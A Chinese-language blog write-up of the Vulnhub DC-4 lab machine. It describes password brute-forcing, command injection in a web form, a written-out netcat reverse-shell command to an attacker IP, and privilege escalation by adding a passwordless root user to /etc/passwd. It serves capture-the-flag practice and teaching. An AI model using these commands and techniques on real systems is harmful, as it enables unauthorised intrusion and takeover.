---
title: Vulnhub - DC-4 の Write-Up
date: 2019-11-20 14:24:17
categories:
- WriteUPs
- Vulnhub
tags:
- Web
- DC Series
---
## 前言

[Vulnhub](https://www.vulnhub.com/)之DC系列靶机[DC-4](http://www.five86.com/downloads/DC-4.zip)的Write-up。

<!-- more -->

## Step 1

扫描找靶机IP+扫描靶机端口找服务老套路，这次没有设置奇怪的端口。

![](/img/DC-4/DC-4-1.png)

![](/img/DC-4/DC-4-2.png)

## Step 2

访问80端口的Web服务是一个简单的登录框。以为登录框会有注入漏洞啥的，首先扫了一下网站目录结构，没有任何发现。然后用nikto帮助找一下思路，还是一无所获。

![](/img/DC-4/DC-4-3.png)

难道是SQL注入？尝试了万能密码，手动注入，还用SQLMAP跑了一下，果然全是空。

![](/img/DC-4/DC-4-4.png)

## Step 3

行吧，只能上最笨也是最直接的方法了，密码爆破。根据Web界面的提示，说明后台是admin用户，那就简单了。只需要爆破admin用户的密码即可，BurpSuite跑的有点慢，所以用hydra搞定了。

![](/img/DC-4/DC-4-5.png)

登录进系统发现可以执行命令，刚开始以为做了防护，提交的仅仅是编号。结果使用BurpSuite抓包后发现还是直接提交命令。修改命令，回显可以成功执行。

![](/img/DC-4/DC-4-6.png)

![](/img/DC-4/DC-4-7.png)

## Step 4

使用`nc -e /bin/bash 172.16.12.129 4444`反弹shell到Kali上。

![](/img/DC-4/DC-4-8.png)

反弹回来的是一个非交互式的shell，通过`python -c "import pty; pty.spawn('/bin/sh')"`得到交互式shell。在/home/jim/backups/文件夹下有个old-passwords.bak文件，里面是一些密码。

![](/img/DC-4/DC-4-9.png)

## Step 5

利用上一步得到的密码文件爆破ssh端口。

![](/img/DC-4/DC-4-10.png)

## Step 6

ssh登录靶机之后，在/var/mail文件夹下找到一封邮件，邮件中有Charles账户的密码。

![](/img/DC-4/DC-4-11.png)

利用该密码可ssh登录Charles账户。

## Step 7

登录Charles账户后发现可以用sudo命令执行teehee命令，查看teehee命令用法。

![](/img/DC-4/DC-4-12.png)

利用teehee命令向/etc/passwd中添加一个和root权限一样的无密码用户，这样就可以切换到root用户，在根目录下找到flag。

![](/img/DC-4/DC-4-13.png)